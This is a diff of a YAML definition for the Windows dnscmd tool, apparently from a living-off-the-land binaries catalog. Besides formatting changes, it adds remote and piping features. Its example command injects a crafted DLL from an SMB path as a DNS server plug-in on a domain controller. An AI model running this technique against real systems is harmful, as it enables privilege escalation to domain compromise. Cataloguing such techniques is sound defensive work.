@@ -2,7 +2,8 @@
 id: windows-execution-dnscmd
 namespace: windows:execution:dnscmd
 name: dnscmd
-description: 'A command-line interface for managing DNS servers Located at: C:\Windows\System32\Dnscmd.exe; C:\Windows\SysWOW64\Dnscmd.exe.'
+description: 'A command-line interface for managing DNS servers Located at: C:\Windows\System32\Dnscmd.exe;
+  C:\Windows\SysWOW64\Dnscmd.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -41,7 +42,10 @@ resource_profile:
 allowed-tools:
 - dnscmd
 parameters: []
-features: []
+features:
+- pipes-stdin
+- pipes-stdout
+- remote
 execution:
   template: dnscmd
   sandbox: execFile
@@ -49,7 +53,9 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details. (Remotely inject dll to dns server)
+- description: Adds a specially crafted DLL as a plug-in of the DNS Service. This
+    command must be run on a DC by a user that is at least a member of the DnsAdmins
+    group. See the reference links for DLL details. (Remotely inject dll to dns server)
   command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
 references:
 - label: feature-not-bug-dnsadmin-to-dc-compromise-in-one-l
@@ -78,7 +84,6 @@ install:
   commands:
   - choco install dnscmd
 ---
-
 
 # dnscmd
 
